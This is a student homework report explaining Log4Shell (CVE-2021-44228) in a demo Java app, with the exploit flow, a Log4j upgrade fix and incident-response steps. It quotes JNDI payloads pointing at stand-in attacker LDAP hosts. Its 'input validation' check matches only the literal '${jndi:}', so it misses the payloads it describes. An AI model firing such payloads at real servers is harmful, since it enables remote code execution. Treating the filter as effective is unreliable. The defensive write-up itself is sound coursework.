# SEAS-8405 Homework 9 - Log4Shell Vulnerability Report

Stephen Carver
---

## 1. Executive Summary

This report details a Log4Shell (CVE-2021-44228) vulnerability found in a Java application. It outlines the application architecture, explains how the exploit occurs, and describes the mitigation steps taken. The "before" state of the application used a vulnerable version of Log4j (2.14.1), allowing for potential Remote Code Execution (RCE) via malicious JNDI LDAP lookups. The "after" state demonstrates the implemented fix by upgrading Log4j to version 2.17.0 and adding input validation.

---

## 2. Architecture Diagram



**Conceptual Diagram Description:**

* **User/Attacker:** An external entity interacting with the Java application.
* **Java Application (`app` service):**
    * Runs in a Docker container.
    * Exposes port 8080.
    * Contains a Spring Boot application with a `/log` endpoint.
    * Uses Log4j for logging.
    * Communicates with the LDAP server if a JNDI lookup is processed by a vulnerable Log4j version.
* **LDAP Server (`ldap` service):**
    * Runs in a separate Docker container (image: `osixia/openldap:1.5.0`).
    * Exposes port 389.
    * In the exploit scenario, this represents an attacker-controlled LDAP server.
    * The `docker-compose.yml` defines this service with `LDAP_ORGANISATION=Attacker` and `LDAP_DOMAIN=attacker.com`.
* **Network:**
    * Both services are on the same Docker network, allowing them to communicate.
    * The `extra_hosts` configuration `"host.docker.internal:host-gateway"` is present but not directly involved in this specific exploit path.

**Flow of Exploit:**

1.  Attacker sends a malicious string (e.g., `${jndi:ldap://attacker-ldap-server/a}`) to the `/log` endpoint of the Java application.
2.  The Java application's vulnerable Log4j library attempts to resolve the JNDI lookup.
3.  Log4j makes a connection to the (attacker-controlled) LDAP server.
4.  The LDAP server can respond with a reference to a malicious Java class, which the application would then load and execute (RCE). The provided `ldap_server.py` simulates the listening part of this attacker server.

---

## 3. Exploit Explanation (Log4Shell - CVE-2021-44228)

The Log4Shell vulnerability (CVE-2021-44228) affected Apache Log4j, a widely used Java logging library. The core of the vulnerability lies in how Log4j processed log messages.

**Vulnerable State (Before Fix):**

1.  **Log4j Version:** The application was using Log4j version `2.14.1` for both `log4j-core` and `log4j-api`. This version is known to be vulnerable to Log4Shell.
2.  **JNDI Lookups:** Log4j, in vulnerable versions, supported JNDI (Java Naming and Directory Interface) lookups within log messages. When a string like `${jndi:...}` was logged, Log4j would attempt to resolve it.
3.  **Attacker-Controlled Input:** The `LogController.java` in the "before" state takes user input and logs it directly: `logger.info("User input: " + input);`.
4.  **Exploitation Steps:**
    * An attacker can craft a malicious input string, for example: `${jndi:ldap://attacker.com/a}`.
    * This string is sent to the `/log` endpoint of the Java application.
    * The application's `LogController` passes this string to `logger.info()`.
    * The vulnerable Log4j library parses this string and encounters the JNDI lookup.
    * Log4j attempts to connect to the specified LDAP server (e.g., `attacker.com`, which would be controlled by the attacker).
    * The attacker's LDAP server (simulated by `ldap_server.py` which listens for connections and received data) can then serve a JNDI reference that points to a remote Java class file.
    * The vulnerable Java application will deserialize or load this remote class, leading to Remote Code Execution (RCE) on the application server.

**Demonstration with Provided Files:**

* The `docker-compose.yml` sets up the Java application (`app`) and an LDAP server (`ldap`). While the provided `ldap` service in `docker-compose.yml` is `osixia/openldap`, the exploit typically involves the JNDI lookup pointing to an *external* attacker-controlled LDAP server. The `ldap_server.py` is a simple Python script that can act as a fake LDAP server listening for connections, demonstrating that a callback can be received.
* If an attacker sends `${jndi:ldap://<ip_of_machine_running_ldap_server.py>:389/Exploit}` to the `/log` endpoint of the "before" application, the Log4j library would attempt to connect to the Python LDAP server. The `ldap_server.py` would print a message indicating a connection was received.

---

## 4. Mitigation and Response Summary

The vulnerability was addressed through a combination of upgrading the Log4j library and implementing input sanitization as a defense-in-depth measure.

**Mitigation Steps Implemented (After Fix):**

1.  **Log4j Version Upgrade:**
    * The primary mitigation was to update the Log4j library versions in the `pom.xml` file.
    * `log4j-core` and `log4j-api` were upgraded from `2.14.1` to `2.17.0`.
    * Log4j version `2.17.0` disables JNDI lookups by default and removes the message lookup feature, directly addressing the root cause of CVE-2021-44228 and subsequent related vulnerabilities (like CVE-2021-45046, CVE-2021-45105).

2.  **Input Validation/Sanitization:**
    * As an additional security layer, the `LogController.java` was modified to include basic input validation.
    * The code now checks if the input string contains the pattern `${jndi:}`:
        ```java
        if (input.contains("${jndi:}")){ //
            return "Invalid input detected"; //
        }
        ```
    * If this pattern is detected, the application rejects the input and does not log it in a way that would trigger JNDI lookup, even if the Log4j version were somehow still vulnerable or a new, similar vulnerability emerged.

**Incident Response Summary (General Recommendations):**

While the provided files focus on the technical fix, a typical incident response to Log4Shell would involve:

1.  **Identification:** Discovering the use of vulnerable Log4j versions within systems. This involves scanning applications and their dependencies.
2.  **Containment:**
    * Immediately restricting outbound traffic from potentially affected servers to prevent callbacks to attacker-controlled LDAP/RMI servers, if patching is not immediately possible.
    * Applying temporary workarounds like setting `log4j2.formatMsgNoLookups` to `true` for Log4j versions >=2.10, if an immediate upgrade isn't feasible (though upgrading is the preferred solution).
3.  **Eradication:**
    * **Patching/Upgrading:** Upgrading Log4j to a non-vulnerable version (e.g., 2.17.0 or later as recommended by Apache) is the most effective way to eradicate the vulnerability.
    * Removing the `JndiLookup` class from the classpath as a temporary measure if patching is delayed.
4.  **Recovery:**
    * Restoring systems from secure backups if a compromise is suspected.
    * Thoroughly scanning systems for any signs of compromise or persistence mechanisms established by attackers.
5.  **Lessons Learned & Post-Incident Activity:**
    * **Software Bill of Materials (SBOM):** Maintaining an accurate SBOM to quickly identify vulnerable components in the future.
    * **Dependency Management:** Regularly updating dependencies and having a process for quickly patching critical vulnerabilities.
    * **Security Best Practices:** Implementing defense-in-depth, including input validation, network segmentation, and egress filtering.
    * **Security Testing:** Regularly performing vulnerability scanning and penetration testing.
    * **Logging and Monitoring:** Enhancing logging to detect suspicious activities, such as unusual outbound connections or JNDI lookup attempts (even if blocked). The `log4j2.xml` configuration can be reviewed to ensure appropriate log levels and appenders are in place for monitoring.

The `docker-compose.yml` files for "before" and "after" are identical in terms of service definitions and ports, indicating the core infrastructure setup did not change, only the application code and its dependencies. The `log4j2.xml` configuration file also remained unchanged between the "before" and "after" states, focusing the mitigation efforts on the library version and application code.